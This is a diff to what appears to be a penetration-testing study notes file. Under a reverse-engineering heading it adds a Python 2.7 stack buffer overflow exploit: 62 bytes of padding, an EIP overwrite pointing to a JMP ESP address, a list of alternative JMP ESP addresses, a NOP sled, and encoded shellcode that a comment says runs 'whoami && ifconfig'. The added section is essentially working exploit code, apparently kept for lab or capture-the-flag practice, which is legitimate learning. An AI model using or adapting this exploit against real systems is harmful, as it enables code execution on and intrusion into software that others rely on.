@@ -109,6 +109,40 @@ sudo apt install nikto -y
     Heap, Stack, Gen. Register, Ctrl. Register, Flags Register
     
 ### Reverse Engineering Workflow (Software)
-    
+```Shell
+#!/usr/bin/python2.7
+
+# FILL UP THE BUFFER 
+buf = "A" * 62
+
+#EIP Register to JMP ESP
+
+buf += "\x59\x3b\xde\xf7"
+
+#The mem addresses for JMP ESP
+
+'''
+0xf7de3b59 "\x59\x3b\xde\xf7"
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+'''
+## Assits with encoding NOP SLED
+buf += "\x90" * 10
+
+# Shell Code / palyoad below
+# set CMD whoami && ifconfig
+
+
+buf += b"\xdb\xc3\xd9\x74\x24\xf4\x58\xbb\xe6\xef\x4a\x63"
+buf += b"\x29\xc9\xb1\x0e\x31\x58\x19\x03\x58\x19\x83\xe8"
+buf += b"\xfc\x04\x1a\x20\x68\x90\x7c\xe7\x08\x48\x52\x6b"
+buf += b"\x5c\x6f\xc4\x44\x2d\x07\x15\xf3\xfe\xb5\x7c\x6d"
+buf += b"\x88\xda\x2d\x99\x99\x1c\xd2\x59\xe9\x74\xbd\x38"
+buf += b"\x78\xed\x61\x9d\xa4\xcd\x08\x87\xcb\x62\xa5\x21"
+buf += b"\x65\x1b\x39\xf9\x26\x6a\xd8\xc8\x49"
+
+print(buf)
+```
 ### Post Exploitation
             
